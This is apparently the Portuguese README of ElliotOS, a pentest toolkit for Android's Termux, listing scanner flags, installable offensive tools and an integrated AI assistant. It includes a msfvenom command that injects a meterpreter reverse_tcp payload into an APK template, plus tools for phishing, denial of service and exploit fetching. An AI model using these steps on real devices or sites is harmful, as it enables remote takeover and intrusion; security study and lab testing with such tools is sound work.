<div align="center">

```
█████  █      █      █████   ███   █████   ███    ████
█      █      █        █    █   █    █    █   █  █    
████   █      █        █    █   █    █    █   █  █    
█      █      █        █    █   █    █    █   █   ███ 
█      █      █        █    █   █    █    █   █      █
█████  █████  █████  █████   ███     █     ███   ████ 
```

**O primeiro sistema de pentest nativo para Android — sem root, no bolso.**

[![Plataforma](https://img.shields.io/badge/Plataforma-Android%20%2F%20Termux-green?style=flat-square)](https://github.com/mikeelliot218/ElliotOS)
[![Root](https://img.shields.io/badge/Root-NÃO%20necessário-brightgreen?style=flat-square)](#)
[![Linguagem](https://img.shields.io/badge/Lua%205.4%20%2B%20C%20puro-blue?style=flat-square)](#)
[![Licença](https://img.shields.io/badge/Licença-MIT-lightgrey?style=flat-square)](#licença)
[![Gratuito](https://img.shields.io/badge/Gratuito-100%25-orange?style=flat-square)](#)

</div>

---

## O que é o ElliotOS?

O ElliotOS é um sistema operacional de segurança e pentest construído **dentro do Termux**, o emulador de terminal do Android. Desenvolvido por **Mike Elliot**, nasceu de uma necessidade real: não existia nenhum toolkit de pentest funcional para Android.

Kali Linux, Black Arch, Parrot OS — todos exigem PC. O ElliotOS roda no bolso, direto do celular, **sem root, sem VM, sem frescura**.

Tudo é compilado e instalado via um único script (`luascript.sh`), que constrói do zero:
- Um interpretador Lua 5.4 customizado com extensões de rede (`lua-net`)
- Uma biblioteca C com 23 módulos de segurança embutidos (`libnet.so`)
- Uma IA nativa chamada **CYN**, integrada diretamente ao binário
- Ferramentas próprias: `ms`, `lpm`, `xpm`, `cxx`, `ee`

---

## Instalação

> **Requisitos:** Android com [Termux](https://f-droid.org/packages/com.termux/) instalado via F-Droid. Sem root.

```bash
# 1. Instale o Termux pelo F-Droid (não use a versão da Play Store — está desatualizada)
# 2. No Termux:

pkg update -y && pkg install -y git wget curl

git clone https://github.com/mikeelliot218/ElliotOS.git
cd ElliotOS
bash luascript.sh
```

A instalação compila tudo do zero e leva cerca de **15 a 20 minutos** dependendo do dispositivo. Nenhuma etapa exige root.

---

## Ferramentas incluídas

### Binários nativos (compilados em C)

| Comando | Descrição |
|---------|-----------|
| `ms` | MoonStyle — REPL interativo Lua 5.4 com extensões de rede |
| `lua-net` | Interpretador Lua com 23 módulos de segurança embutidos |
| `luar` | Alias do lua-net para scripts avançados |
| `lpm` | Gerenciador de pacotes Lua (instala módulos .lua e exploits) |
| `xpm` | Gerenciador de ferramentas de pentest (instala ferramentas sem root) |
| `cxx` | Compilador C/C++ simplificado para o ambiente ElliotOS |
| `ee` | Editor de texto nativo em C, leve e rápido |

### CYN — IA nativa

```
ms -a
```

A CYN é a inteligência artificial integrada diretamente no ElliotOS. Ela conhece todos os módulos, flags, funções e a arquitetura do sistema. Responde sempre em português, é técnica, objetiva e focada em segurança.

Suporta múltiplos providers: **Gemini**, **OpenAI**, **Claude** e outros — configuráveis via `ms -a`.

### ms — Referência de flags

**Geral**
```bash
ms                            # REPL interativo
ms -c 'codigo lua'           # executa Lua sem abrir REPL
ms -f script.lua             # executa arquivo
ms -e                         # abre ElliotOS Editor (arquivo novo)
ms -e arquivo               # abre/cria arquivo no ElliotOS Editor
ms -lua2c arquivo.lua       # transpila Lua → C (gera arquivo.c)
ms -lua2c -r arquivo.lua   # transpila e compila com cxx
ms -i                         # info do sistema
ms -v                         # versão
ms -h                         # ajuda completa
```

**IA (CYN)**
```bash
ms -a                         # chat interativo com a CYN
ms -a 'pergunta'             # pergunta direta
ms -A 'pergunta'             # resposta raw sem formatação
ms -a -f arq 'pergunta'      # passa arquivo como contexto para a CYN
ms --search 'query'          # pesquisa na web e resume o resultado
ms --code [-o arq] 'tarefa'  # gera código/script (-o salva no arquivo)
```

**Rede**
```bash
ms -g url                    # HTTP GET
ms --post url dados          # HTTP POST
ms --headers url             # headers da resposta
ms --ip                       # IP público
ms -d host                   # DNS lookup
ms -P host                   # ping
ms --scan host p1 p2         # port scan
ms --listen porta            # listener TCP
ms --socket fam type h p     # fire-and-forget socket
```

**Pentest**
```bash
ms -x url [N]                # XSS
ms -q url [N]                # SQLi
ms -l url [N]                # LFI
ms -r url [N]                # RCE
ms -N url                    # NoSQL Injection
ms --ssrf url [N]            # SSRF
ms --redir url [N]           # Open Redirect
ms --ssti url [N]            # SSTI
ms --scan-all url [N]        # todos os scanners de uma vez
ms -s url [limit] [ep]       # spider (ep filtra só endpoints)
ms -p easy|med|hard          # sobe lab vulnerável
ms -p stop                    # encerra todos os labs
ms -web arquivo porta        # sobe servidor HTML
ms -web stop                  # para o servidor web
ms --exploit-rce url         # exploit.rce REPL
ms --exploit-sqli url        # exploit.sqli REPL
ms --exploit-lfi url         # exploit.lfi REPL
```

> `N` = número de endpoints a testar (padrão: 1; 0 = todos)

**APK**
```bash
ms --apk app.apk [app2.apk ...]  # testa compatibilidade e instalabilidade (aceita vários)
ms --apk-sign app.apk            # alinha e assina um APK já compilado
web2apk build <dir> [opções]     # converte HTML/CSS/JS em APK sem root
```

**Crypto**
```bash
ms --md5 'texto'             # hash MD5
ms --sha256 'texto'          # hash SHA256
ms --b64e 'texto'            # Base64 encode
ms --b64d 'b64'              # Base64 decode
ms --jwt 'token'             # decodifica JWT
```

**Filesystem**
```bash
ms --cat arquivo             # lê e imprime arquivo
ms --ls [dir]               # lista diretório
ms --write arq texto         # escreve arquivo
```

**Shell / Sistema**
```bash
ms --sh 'cmd'                # executa shell e captura output
ms --ps                       # lista processos
ms --kill pid               # mata processo
ms --env [VAR]              # variáveis de ambiente
```

**Scripts**
```bash
ms --script nome             # executa script Lua ou C do diretório de scripts
ms --script nome -- [args]   # com argumentos
ms --cscript nome.c          # compila e executa script C
ms --cscript binario         # executa binário C já compilado

# Exemplos:
ms --script cosmic.lua -- --os 8.8.8.8
ms --script portscan.lua -- 192.168.1.1 80 443
ms --script xerxes.c -- 192.168.1.1 80
```

**Aprender**
```bash
ms --learn                   # tutorial interativo em português
ms --examples                # lista scripts de exemplo prontos
```

**Diagnóstico**
```bash
ms -t                        # self-test
ms -tv                       # self-test verbose
ms -T                        # stress test
ms -Tv                       # stress test verbose
```

---

## web2apk — HTML/CSS/JS para APK

O `web2apk` converte qualquer projeto web local em um APK Android funcional, **sem root, sem Android Studio, sem PC**. Não vem instalado por padrão — é uma ferramenta do XPM:

```bash
xpm install web2apk
```

```bash
# Estrutura mínima do projeto
./meuapp/
├── index.html   ← ponto de entrada obrigatório
├── style.css
└── script.js

# Gerar APK básico
web2apk build ./meuapp/

# Com nome, ícone e permissões
web2apk build ./meuapp/ --name "Meu App" --pkgname com.meuapp --perm camera,mic --fullscreen

# Converter um site remoto em APK
web2apk build --url https://exemplo.com --name "Meu Site"

# Gerar template de projeto pronto para editar
web2apk template basic    # HTML + CSS + JS básico
web2apk template game     # Jogo Snake funcional
web2apk template pwa      # PWA com suporte offline

# Manual: o que cada arquivo deve conter para o APK funcionar
web2apk --man
```

### Opções principais

| Opção | Descrição |
|-------|-----------|
| `--name "Nome"` | Nome exibido no launcher |
| `--pkgname com.pkg.id` | Package ID único |
| `--icon /path/icon.png` | Ícone PNG do app |
| `--perm cam,mic,...` | Permissões Android |
| `--orientation portrait\|landscape\|auto` | Orientação da tela |
| `--fullscreen` | Esconde a status bar |
| `--theme dark\|light\|transparent` | Tema da WebView |
| `--url https://...` | Carrega URL remota em vez de arquivos locais |

> O projeto pode ter múltiplos arquivos HTML, CSS e JS — e subpastas. O único obrigatório como ponto de entrada é o `index.html`.

---

## XPM — Gerenciador de Pentest

O `xpm` instala ferramentas de segurança **sem usar o repositório do Termux** (que não tem ferramentas de pentest). Tudo é compilado do código-fonte ou instalado via pip/go/cargo diretamente.

```bash
# Ver todas as ferramentas disponíveis
xpm search list

# Buscar ferramenta específica
xpm search nmap

# Instalar uma ferramenta
xpm install sqlmap

# Instalar várias de uma vez
xpm install sqlmap nikto dirsearch nmap

# Ver o que está instalado
xpm list

# Atualizar uma ferramenta
xpm update sqlmap

# Remover
xpm remove sqlmap

# Diagnóstico geral
xpm doctor
```

### Ferramentas disponíveis no XPM

| Categoria | Ferramenta | Método de instalação |
|-----------|------------|----------------------|
| Scanner | nmap, rustscan, naabu | Compilado do fonte |
| Web | sqlmap, nikto, commix, whatweb, xsstrike | pip / fonte |
| Fuzzing | ffuf, gobuster, dirsearch, wfuzz | go / pip |
| Reconhecimento | amass, subfinder, assetfinder, dnsrecon | go / pip |
| OSINT | sherlock, maigret, holehe, sublist3r, theharvester | pip |
| Password | hydra, john | Compilado do fonte |
| Exploração | metasploit, sqlmap, searchsploit, slowloris | gem / pip / fonte |
| Engenharia Reversa | radare2, binwalk, ropper, androguard | fonte / pip |
| MITM | mitmproxy | pip |
| Malware | yara | Compilado do fonte |
| Eng. Social | zphisher | github |
| CTF / Binários | pwntools | pip |
| Wordlists | seclists | github |
| AD / Rede | impacket, nuclei | pip / go |
| Criação de APK | web2apk | nativo ElliotOS |

> **Nenhuma ferramenta exige root para ser instalada ou usada no Termux.**

---

## msfvenom — Payload em APK com template

O ElliotOS integra o Metasploit com suporte a `msfvenom -x` para injetar payloads em APKs existentes. A instalação exige três ferramentas e um passo de diagnóstico:

```bash
# Passo 1 — instalar as ferramentas
xpm install apkfull apkeditor metasploit

# Passo 2 — aplicar otimizações e correções no ambiente
xpm doctor
```

O `xpm doctor` não é opcional — ele é quem configura o ambiente de verdade. Ao rodar, ele:

- Substitui o apktool interno do Metasploit pelo **apkeditor** diretamente no `apk.rb`, garantindo compatibilidade com APKs antigos e modernos
- Corrige referências a `/tmp` (que **não existe no Termux**) redirecionando tudo para `$TMPDIR`, que aponta permanentemente para `/data/data/com.termux/files/usr/tmp`
- Instala wrappers de `msfvenom`, `msfconsole` e `msfrpc` com heap adaptativo para Android
- Cria e configura o keystore de assinatura de APKs
- Aplica correções no `apk.rb`: flags, versão mínima, caminhos de payload, multidex, fallback de Activity e FileUtils
- Remove arquivos desnecessários do bundle (docs, spec, test, .github) para economizar espaço
- Sobe o banco de dados do msfdb

Após os dois passos, o ambiente estará 100% funcional:

```bash
# Gerar payload e injetar em um APK template
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -x /caminho/template.apk \
  -o payload.apk
```

### Por que apkeditor e não apktool nativo?

| | apktool (padrão do Metasploit) | apkeditor (ElliotOS) |
|---|---|---|
| APKs antigos (pré-2018) | ✓ | ✓ |
| APKs modernos (Android 10+) | ✗ parcial | ✓ |
| APKs com resources binários | ✗ falha | ✓ |
| Split APKs | ✗ | ✓ |
| Disponível no Termux sem root | ✗ | ✓ (tur-repo) |
| Compatível com `$TMPDIR` do Termux | ✗ | ✓ |

### Sobre o $TMPDIR

O Termux não possui `/tmp`. O script de instalação do ElliotOS define `$TMPDIR` permanentemente apontando para:

```
/data/data/com.termux/files/usr/tmp
```

O `xpm doctor` garante que o Metasploit, o apkeditor e todos os scripts que manipulam arquivos temporários usem esse caminho — sem necessidade de configuração manual.

---

## LPM — Gerenciador de Pacotes Lua

O `lpm` instala módulos Lua e scripts de exploit:

```bash
# Instalar módulo do LuaRocks
lpm install luasocket

# Buscar exploits no GitLab/PacketStorm/GitHub (cache 24h)
lpm --script eternalblue

# Instalar exploit por nome
lpm install --from exploit eternalblue

# Listar módulos instalados
lpm list
```

---

## Scripts de exemplo

O ElliotOS instala scripts prontos em `/usr/share/lua-scripts/`:

```bash
# Tutorial interativo do Lua no ElliotOS
ms -f /usr/share/lua-scripts/learn.lua

# Reconhecimento básico de um alvo
ms -f /usr/share/lua-scripts/recon.lua -- alvo.com

# Port scan via Lua nativo
ms -f /usr/share/lua-scripts/portscan.lua -- 192.168.1.1

# Verificação HTTP
ms -f /usr/share/lua-scripts/webcheck.lua -- https://alvo.com
```

---

## Interface Gráfica (opcional)

O ElliotOS suporta ambiente gráfico XFCE4 via Termux:X11:

```bash
# Requisito: instale o app Termux:X11 pelo F-Droid ou GitHub Releases

# Instala o ambiente gráfico automaticamente junto com o ElliotOS
# Se já estiver instalado, para iniciar:
elliot-gui

# Encerrar
elliot-gui --kill
```

---

## Estrutura do projeto

```
ElliotOS/
├── luascript.sh          # Script único de instalação (~108k linhas)
│   ├── libnet.c          # Biblioteca C com 23 módulos de segurança
│   ├── Lua 5.4 source    # Interpretador customizado
│   ├── lua-net binary    # Embutido como heredoc compilado na instalação
│   ├── xpm               # Gerenciador de pentest (Bash)
│   │   └── web2apk       # Conversor HTML/CSS/JS → APK (instalável via xpm)
│   ├── lpm               # Gerenciador de pacotes Lua (Bash)
│   ├── cxx               # Compilador wrapper (Bash)
│   ├── ee                # Editor nativo (C, embutido)
│   └── scripts/          # learn.lua, recon.lua, portscan.lua, webcheck.lua
└── README.md
```

---

## Configurando a CYN (IA)

```bash
# Abre o chat com a CYN
ms -a

# Na primeira execução, ela pede a chave de API.
# Suporta: Gemini (gratuito), OpenAI, Claude (Anthropic), e outros.
```

Para obter uma chave gratuita do Gemini: [aistudio.google.com](https://aistudio.google.com)

---

## Requisitos de hardware

| Item | Mínimo |
|------|--------|
| Android | 7.0+ |
| RAM | 2 GB |
| Armazenamento livre | 2 GB (com ferramentas XPM, mais) |
| Root | **Não necessário** |
| Conexão | Necessária apenas na instalação |

---

## Autor

**Mike Elliot** — desenvolvedor independente, criador do ElliotOS.

- YouTube: [@Mikeelliotmkll12](https://youtube.com/@Mikeelliotmkll12)
- GitHub: [github.com/mikeelliot218](https://github.com/mikeelliot218)

---

## Licença

MIT — livre para usar, estudar, modificar e distribuir. Gratuito para sempre.

---

<div align="center">

*"Black Arch, Kali, Parrot — todos no PC. O ElliotOS fica no bolso."*

**⭐ Se o projeto te ajudou, deixa uma estrela no repositório.**

</div>
